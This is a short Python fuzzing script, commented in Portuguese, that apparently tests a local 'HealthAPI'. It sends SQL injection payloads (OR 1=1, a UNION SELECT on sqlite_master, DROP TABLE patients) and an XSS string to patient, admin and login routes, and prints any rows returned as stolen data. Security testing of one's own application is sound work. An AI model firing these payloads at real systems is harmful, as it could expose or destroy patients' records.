import requests

BASE_URL = "http://localhost:8000"

ENDPOINTS = [
    "/api/patients",
    "/api/admin/system",
    "/login"
]

PAYLOADS = [
    "' OR 1=1--",                # Extração total
    "\" OR \"\"=\"",             # Extração alternativa
    "<script>alert(1)</script>", # XSS
    "A" * 50,                  # Stress
    "1; DROP TABLE patients",    # Destruição
    "' UNION SELECT 1, type, name FROM sqlite_master--" # Descoberta de tabelas
]

print("🔥 Iniciando Fuzzer Red Team contra HealthAPI...")
print(f"Alvo Base: {BASE_URL}\n")

for endpoint in ENDPOINTS:
    target = BASE_URL + endpoint
    print(f"\n[*] Iniciando varredura na Rota: {target}")

    for payload in PAYLOADS:
        try:
            response = requests.get(target, params={"name": payload}, timeout=2)
            
            if response.status_code == 200:
                data = response.json()
                resultados = data.get("resultados", [])
                
                # Se o payload malicioso trouxe QUALQUER resultado, é invasão.
                if len(resultados) > 0:
                    print(f"  🚨 [CRÍTICO] INVASÃO CONFIRMADA! Payload: {payload}")
                    print("      [+] Dados Extraídos:")
                    
                    # Imprime cada linha roubada do banco diretamente
                    for row in resultados:
                        print(f"          -> {row}")
                
                elif "erro" in data:
                    print(f"  ⚠️ [ERRO INTERNO] O banco de dados expôs um erro. Payload: {payload}")
                else:
                    print(f"  🛡️ [BLINDADO] Nenhum dado vazado. Payload: {payload}")
            
            elif response.status_code == 500:
                print(f"  ⚠️ [AVISO] A aplicação quebrou (Erro 500). Payload: {payload}")
            elif response.status_code == 404:
                print(f"  [-] Rota não encontrada (404).")
                break

        except requests.exceptions.RequestException:
            print(f"  [X] Falha de conexão.")

print("\n🏁 Fuzzing concluído.")